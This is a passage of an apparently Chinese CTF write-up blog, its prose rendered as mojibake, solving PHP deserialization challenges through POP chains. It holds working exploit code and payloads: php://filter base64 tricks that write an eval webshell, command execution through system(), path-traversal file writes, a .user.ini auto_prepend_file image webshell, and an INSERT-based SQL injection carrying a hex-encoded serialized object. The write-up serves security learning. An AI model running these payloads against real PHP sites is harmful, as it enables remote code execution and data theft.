class="line">            <span class="comment">//æ•°æ®å‹ç¼©</span></span><br><span class="line">            $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, $expire) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . $data;</span><br><span class="line">        $result = file_put_contents($filename, $data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;src&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_dir($dir))</span><br><span class="line">&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure>
<p>é¢˜ç›®æç¤ºçš„å¾ˆæ˜æ˜¾ï¼Œéœ€è¦æ„é€ ä¸€ä¸ªPOPé“¾ï¼Œèƒ½åˆ©ç”¨çš„é­”æ³•å‡½æ•°åªæœ‰ <code>A::__destruct()</code>ï¼Œå¯èƒ½å¯ä»¥åˆ©ç”¨çš„æ•æ„Ÿå‡½æ•°ï¼šB ç±» <code>set()</code> ä¸­çš„ <code>file_put_contents()</code>ã€‚å…ˆåˆ†æä¸€ä¸‹ <code>file_put_contents()</code> å‡½æ•°æ˜¯å¦æ»¡è¶³åˆ©ç”¨æ¡ä»¶ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$data = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, $expire) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . $data;</span><br><span class="line">$result = file_put_contents($filename, $data);</span><br></pre></td></tr></table></figure>
<p>åœ¨ exit() ä»£ç åé¢æ‹¼æ¥ <code>$data</code> æ•°æ®ï¼Œç„¶åå†™å…¥æ–‡ä»¶ã€‚è¿™æ ·å°±ä¼šå¯¼è‡´æˆ‘ä»¬é€šè¿‡<code>$data</code>å†™å…¥çš„shlléƒ½ä¸ä¼šè¢«æ‰§è¡Œã€‚</p>
<p>exit()å‡½æ•°å¯ä»¥åˆ©ç”¨<code>base64_decode</code>ä»¥åŠ<code>php://filter</code>å¯ä»¥ç»•è¿‡ã€‚</p>
<blockquote>
<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨</a></p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200815093758.png" alt=""></p>
<p>è¿™é‡Œæ€è·¯æ˜¯<strong>åˆ©ç”¨ <code>php://filter</code> æä¾›çš„å„ç§å‡½æ•°å»é™¤ â€œæ­»äº¡exitâ€</strong>ã€‚</p>
<p>æ¥ä¸‹æ¥å¼€å§‹å¯»æ‰¾ POP é“¾</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200815093927.png" alt=""></p>
<p>æ¥ä¸‹æ¥å›æº¯çœ‹<code>$filename</code>å’Œ``$data`æ˜¯æ€ä¹ˆæ¥çš„ï¼š</p>
<p><code>$filename</code>ï¼šå…ˆè°ƒç”¨<code>getCacheKey($name)</code>ï¼Œæ”¹æ–¹æ³•æ˜¯æ‰§è¡Œè¿æ¥å­—ç¬¦ä¸²çš„ä½œç”¨ï¼š<code>$this-&gt;option['prefix'].$name</code>æ„æˆfilenameã€‚</p>
<p><code>$data</code>ï¼šæ¥è‡ªäº<code> $this-&gt;serialize($value)</code>ï¼Œæ‰€ä»¥å†å…³æ³¨<code>$value</code>æ˜¯æ€ä¹ˆæ¥çš„ã€‚<code>$value</code>æ˜¯<code>A::getForStorage()</code>çš„è¿”å›å€¼ï¼š<code>json_encode([A::cleanContents(A::cache), A::complete]);</code>ã€‚<br>
<code>A::cleanContents(A::cache)</code>å®ç°äº†ä¸€ä¸ªè¿‡æ»¤çš„åŠŸèƒ½ï¼Œ<strong>A::completeæ›´å®¹æ˜“æ§åˆ¶ï¼Œç›´æ¥å†™ä¸ºshellcode</strong>ã€‚</p>
<p>å…¶ä¸­cleanContents():</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> $contents</span>) </span>&#123;</span><br><span class="line">    $cachedProperties = array_flip([</span><br><span class="line">        <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">            $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $contents;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å°è¯•æœ¬åœ°è¿è¡Œï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> $contents</span>) </span>&#123;</span><br><span class="line">    $cachedProperties = array_flip([</span><br><span class="line">        <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">            $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $contents;</span><br><span class="line">&#125;</span><br><span class="line">$cache=<span class="keyword">array</span>();</span><br><span class="line">$complete=<span class="string">&#x27;&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> json_encode([cleanContents($cache), $complete]);</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[[],&quot;&lt;?php @eval($_POST[\&quot;a\&quot;]);?&gt;&quot;]</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°ç›´æ¥completeå†™å…¥shellä¼šä½¿shellä¸­åŒå¼•å·è¢«è½¬ä¹‰äº†ï¼Œæ‰€ä»¥å¾—è€ƒè™‘ç”¨base64ç¼–ç ç»•è¿‡è½¬ä¹‰ï¼Œå†åœ¨ä¹‹åè§£ç ã€‚ç”±äºä¹‹åå¯ä»¥è®©<code>$this-&gt;options['serialize']=base64.decode</code>ï¼Œè¿™æ ·å’Œfilter://å°±å…±æœ‰ä¸¤å¤„è§£ç å¤„ç†ï¼Œæ‰€ä»¥å¯¹åº”è¿™é‡Œè€ƒè™‘ç¼–ç ä¸¤æ¬¡ã€‚</p>
<p>æœ€ç»ˆä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$store,$key,$expire</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key=$key;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire=$expire;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store=$store;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $option;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b=<span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;options[<span class="string">&#x27;serialize&#x27;</span>]=<span class="string">&#x27;base64_decode&#x27;</span>;</span><br><span class="line">$b-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>]=<span class="literal">false</span>;</span><br><span class="line">$b-&gt;options[<span class="string">&#x27;prefix&#x27;</span>]=<span class="string">&#x27;php://filter/write=convert.base64-decode/resource=uploads/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> A($b,<span class="string">&#x27;eval.php&#x27;</span>,<span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave=<span class="literal">false</span>;</span><br><span class="line">$a-&gt;cache=<span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete=base64_encode(<span class="string">&#x27;abc&#x27;</span>.base64_encode(<span class="string">&#x27;&lt;?php @eval($_POST[&quot;a&quot;]); ?&gt;&#x27;</span>));</span><br><span class="line"><span class="comment">//å¿…é¡»æ·»åŠ ä¸‰ä¸ªå­—ç¬¦ä½¿å¾—shellä¹‹å‰çš„å­—ç¬¦ä¸²è¿›è¡Œbase64è§£ç æ—¶ä¸å½±å“åˆ°shell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œè¿˜è¦äº†è§£base64è§£ç ç‰¹ç‚¹ï¼Œbase64è§£ç çš„åˆæ³•å­—ç¬¦åªåŒ…æ‹¬<code>[a-zA-Z1-9]+/</code>è¿™64ä¸ªå­—ç¬¦ã€‚</p>
<ul>
<li>ç¼–ç æ—¶ï¼šæŠŠ<strong>æ˜æ–‡æ¯8ä½æŒ‰6ä½æŸ¥è¡¨è½¬ç </strong>ï¼Œä¸è¶³çš„ä½æ•°ç”¨<code>=</code>è¡¥0</li>
<li>è§£ç æ—¶ï¼šå¿½ç•¥<code>[&quot;,:</code>ç­‰64ä¸ªå­—ç¬¦ä¹‹å¤–çš„å­—ç¬¦ï¼Œç„¶åé€†è¿ç®—å°±è¡Œ</li>
</ul>
<p>æ‰€ä»¥è¦æ±‚ç¼–ç ä¸º4çš„å€æ•°ï¼Œç”±äºshellå‰é¢çš„å­—ç¬¦ä¸²ä¸­å­˜åœ¨çš„base64ç¼–ç æœ‰æ•ˆå­—ç¬¦åªæœ‰<code>php//000000000000exit</code>21ä¸ªå­—ç¬¦ï¼Œå› æ­¤åº”è¯¥åœ¨shellå‰è¡¥ä¸Š3ä¸ªæœ‰æ•ˆå­—ç¬¦ã€‚</p>
<h2 id="2020-æ–°æ˜¥çº¢åŒ…é¢˜">[2020 æ–°æ˜¥çº¢åŒ…é¢˜]</h2>
<p>å’Œä¸Šä¸€é¢˜ç±»ä¼¼ï¼Œåœ¨æ–‡ä»¶åé‚£é‡Œåšäº†ä¸¤ä¸ªå¤„ç†ï¼Œä¸€æ˜¯æ–‡ä»¶ååŒ…å«éšæœºå­—ç¬¦ï¼Œç¬¬äºŒç‚¹æ˜¯é™åˆ¶äº†<code>.php</code>åç¼€ã€‚</p>
<h3 id="è§£æ³•1">è§£æ³•1</h3>
<p>ç›´æ¥å†™å‘½ä»¤ï¼Œç”Ÿæˆflagæ–‡ä»¶ã€‚</p>
<p>å‚è§å®‰å…¨å®¢æ–‡ç« :<a href="https://www.anquanke.com/post/id/194036">https://www.anquanke.com/post/id/194036</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$testB = <span class="keyword">new</span> B();</span><br><span class="line">$testB-&gt;options[<span class="string">&#x27;serialize&#x27;</span>] = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">$testA = <span class="keyword">new</span> A($testB, <span class="string">&quot;miao&quot;</span>);</span><br><span class="line">$testA-&gt;autosave = <span class="number">0</span>;</span><br><span class="line">$testA-&gt;cache = [<span class="string">&#x27;aaq&#x27;</span> =&gt; <span class="string">&#x27;`cat /flag &gt; ./flag.xml`&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($testA)).<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆautosaveè¦ä¸º0ï¼Œ<code>$testB-&gt;options['serialize']</code>è¦ä¸ºsystemå‡½æ•°ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯¹æœ€åçš„å†™æ–‡ä»¶æ²¡ä»€è«è¦æ±‚äº†ï¼Œä½†å¿…é¡»è¦æ‰§è¡Œåˆ°<code>$data = $this-&gt;serialize($value);</code>è¿™æ­¥ï¼Œ<code>$testA-&gt;cache</code>è¦ä¸ºsystemè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚</p>
<h3 id="è§£æ³•2">è§£æ³•2</h3>
<p>å¯¹äºå‰é¢çš„éšæœºå€¼ï¼Œä½¿ç”¨/â€¦/å³å¯æˆªæ–­ï¼Œæ—¶é—´æˆ³å°†ä¼šè¢«è®¤ä¸ºä¸€ä¸ªç›®å½•ï¼Œåé¢å³å¯è¿½åŠ å†™ä»»æ„æ–‡ä»¶ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b -&gt; options = <span class="keyword">array</span>(<span class="string">&#x27;serialize&#x27;</span> =&gt; <span class="string">&quot;base64_decode&quot;</span>, </span><br><span class="line">                      <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                      <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&quot;php://filter/write=convert.base64-decode/resource=uploads/&quot;</span>);</span><br><span class="line">$a = <span class="keyword">new</span> A($store = $b, $key = <span class="string">&quot;/../a.php/.&quot;</span>, $expire = <span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete = base64_encode(<span class="string">&#x27;qaq&#x27;</span>.base64_encode(<span class="string">&#x27;&lt;?php @eval($_POST[&quot;s&quot;]);?&gt;&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
<h3 id="è§£æ³•3">è§£æ³•3</h3>
<p>å…ˆå¯ä»¥åˆ©ç”¨è·¨ç›®å½•ï¼Œè¿™æ ·å°±å¯ä»¥ä¸å»çˆ†ç ´æ–‡ä»¶åï¼Œå†åˆ©ç”¨.user.iniç»•è¿‡åç¼€åé™åˆ¶ã€‚</p>
<p>ä¸Šä¼ å›¾ç‰‡é©¬</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;writeTimes = <span class="number">0</span>;</span><br><span class="line">$b -&gt; options = <span class="keyword">array</span>(<span class="string">&#x27;serialize&#x27;</span> =&gt; <span class="string">&quot;base64_decode&quot;</span>, </span><br><span class="line">                      <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                      <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&quot;php://filter/write=convert.base64-decode/resource=uploads/moyu&quot;</span>);</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($store = $b, $key = <span class="string">&quot;/../../aaaaaa.jpg&quot;</span>, $expire = <span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete = base64_encode(<span class="string">&#x27;qaq&#x27;</span>.base64_encode(<span class="string">&#x27;&lt;?php @eval($_POST[&quot;moyu&quot;]);?&gt;&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
<p>å†ä¸Šä¼ .user.ini</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;writeTimes = <span class="number">0</span>;</span><br><span class="line">$b -&gt; options = <span class="keyword">array</span>(<span class="string">&#x27;serialize&#x27;</span> =&gt; <span class="string">&quot;base64_decode&quot;</span>, </span><br><span class="line">                      <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                      <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&quot;php://filter/write=convert.base64-decode/resource=uploads/moyu&quot;</span>);</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($store = $b, $key = <span class="string">&quot;/../../.user.ini&quot;</span>, $expire = <span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete = base64_encode(<span class="string">&#x27;qaq&#x27;</span>.base64_encode(<span class="string">&quot;\nauto_prepend_file=aaaaaa.jpg&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
<h3 id="å‚è€ƒ">å‚è€ƒ</h3>
<p><a href="http://althims.com/2020/01/29/buu-new-year/">http://althims.com/2020/01/29/buu-new-year/</a></p>
<p><a href="https://www.moonback.xyz/2020/02/10/buuctf%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%98writeup/">moonback</a></p>
<h2 id="å®‰æ´µæ¯2019-ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ ">[å®‰æ´µæ¯2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ </h2>
<h3 id="è€ƒç‚¹-v7">è€ƒç‚¹</h3>
<ul>
<li>æºç æ³„éœ²</li>
<li>insertæ³¨å…¥</li>
<li>PHPååºåˆ—åŒ–</li>
</ul>
<h3 id="è§£é¢˜-v7">è§£é¢˜</h3>
<p>åœ¨ä¸»é¡µçš„æºç ä¸‹æ–¹æœ‰ä¸€ä¸ªå¼€å‘äººå‘˜ç•™çš„ä¿¡æ¯ï¼š<code>wowouploadimage</code>, githubæœç´¢è¿™ä¸ªåç§°ï¼Œå³å¯æ‰¾åˆ°æºç ã€‚</p>
<p>å¤§æ¦‚å°±ä¸‰ä¸ªåŠŸèƒ½ï¼šä¸Šä¼ ã€æŸ¥çœ‹ã€åˆ é™¤ã€‚</p>
<p>æŸ¥çœ‹æºç ï¼Œå‘ç°æœ‰ä¸€ä¸ª<code>__destruct()</code>å‡½æ•°ï¼Œä»¥åŠ<code>file_get_content</code>ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span>(<span class="params">$path</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;ifview == <span class="literal">False</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">			<span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">		&#125;</span><br><span class="line">		$content = file_get_contents($path);</span><br><span class="line">		<span class="keyword">echo</span> $content;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="comment"># Read some config html</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>å†æ‰¾ååºåˆ—åŒ–è§¦å‘çš„ç‚¹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		$sql = <span class="string">&quot;SELECT * FROM images&quot;</span>;</span><br><span class="line">		$result = mysqli_query(<span class="keyword">$this</span>-&gt;con, $sql);</span><br><span class="line">		<span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">		    <span class="keyword">while</span>($row = $result-&gt;fetch_assoc())&#123;</span><br><span class="line">		    	<span class="keyword">if</span>($row[<span class="string">&quot;attr&quot;</span>])&#123;</span><br><span class="line">		    		$attr_temp = str_replace(<span class="string">&#x27;\0\0\0&#x27;</span>, chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), $row[<span class="string">&quot;attr&quot;</span>]);</span><br><span class="line">					$attr = unserialize($attr_temp);</span><br><span class="line">				&#125;</span><br><span class="line">		        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;id=&quot;</span>.$row[<span class="string">&quot;id&quot;</span>].<span class="string">&quot; filename=&quot;</span>.$row[<span class="string">&quot;filename&quot;</span>].<span class="string">&quot; path=&quot;</span>.$row[<span class="string">&quot;path&quot;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		mysqli_close(<span class="keyword">$this</span>-&gt;con);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>ç¬¬14è¡Œååºåˆ—åŒ–çš„å€¼æ˜¯ä»æ•°æ®åº“ä¸­å–å‡ºçš„ï¼Œè€Œåºåˆ—åŒ–çš„å€¼æ˜¯å›¾ç‰‡çš„é•¿å®½ï¼Œä¸å¯æ§ï¼Œå› æ­¤åªèƒ½å°è¯•SQLæ³¨å…¥å°†attrå±æ€§æ›¿æ¢æ‰ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_array</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;	</span><br><span class="line">		$con = mysqli_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;pic_base&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (mysqli_connect_errno($con)) </span><br><span class="line">		&#123; </span><br><span class="line">		    <span class="keyword">die</span>(<span class="string">&quot;Connect MySQL Fail:&quot;</span>.mysqli_connect_error());</span><br><span class="line">		&#125;</span><br><span class="line">		$sql_fields = <span class="keyword">array</span>();</span><br><span class="line">		$sql_val = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">			$key_temp = str_replace(chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, $key);</span><br><span class="line">			$value_temp = str_replace(chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, $value);</span><br><span class="line">			$sql_fields[] = <span class="string">&quot;`&quot;</span>.$key_temp.<span class="string">&quot;`&quot;</span>;</span><br><span class="line">			$sql_val[] = <span class="string">&quot;&#x27;&quot;</span>.$value_temp.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$sql = <span class="string">&quot;INSERT INTO images (&quot;</span>.(implode(<span class="string">&quot;,&quot;</span>,$sql_fields)).<span class="string">&quot;) VALUES(&quot;</span>.(implode(<span class="string">&quot;,&quot;</span>,$sql_val)).<span class="string">&quot;)&quot;</span>;</span><br><span class="line">		mysqli_query($con, $sql);</span><br><span class="line">		$id = mysqli_insert_id($con);</span><br><span class="line">		mysqli_close($con);</span><br><span class="line">		<span class="keyword">return</span> $id;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>filenameå­—æ®µç›´æ¥å¯æ§ï¼Œå¯ä»¥åœ¨ä¸Šä¼ å›¾ç‰‡æ—¶ä¿®æ”¹filenameå®ç°æ³¨å…¥ã€‚</p>
<p>å…ˆç”Ÿæˆpayloadï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $ifview = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">protected</span> $config = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$a = <span class="keyword">new</span> helper();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:6:&quot;helper&quot;:2:&#123;s:9:&quot; * ifview&quot;;b:1;s:9:&quot; * config&quot;;s:5:&quot;&#x2F;flag&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>ç”±äºå­˜åœ¨æ›¿æ¢ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$attr_temp = str_replace(<span class="string">&#x27;\0\0\0&#x27;</span>, chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), $row[<span class="string">&quot;attr&quot;</span>]);</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥æŠŠpayloadå˜ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;&#x2F;flag&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>å› ä¸ºä¸Šä¼ çš„æ–‡ä»¶åä¸­ä¸èƒ½æœ‰åŒå¼•å·ï¼Œæ‰€ä»¥å°†payloadè¿›è¡Œ16è¿›åˆ¶ç¼–ç ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</span><br></pre></td></tr></table></figure>
<p>åŸæ¥çš„æ’å…¥è¯­å¥ä¸º</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> images (<span class="string">`title`</span>,<span class="string">`filename`</span>,<span class="string">`ext`</span>,<span class="string">`path`</span>,<span class="string">`attr`</span>) <span class="keyword">VALUES</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a.jpg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;pic/a.jpg&#x27;</span>,<span class="string">&#x27;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>ä¼ å…¥titleçš„å€¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(&#39;1.jpg</span><br></pre></td></tr></table></figure>
<p>insertæ³¨å…¥å</p>
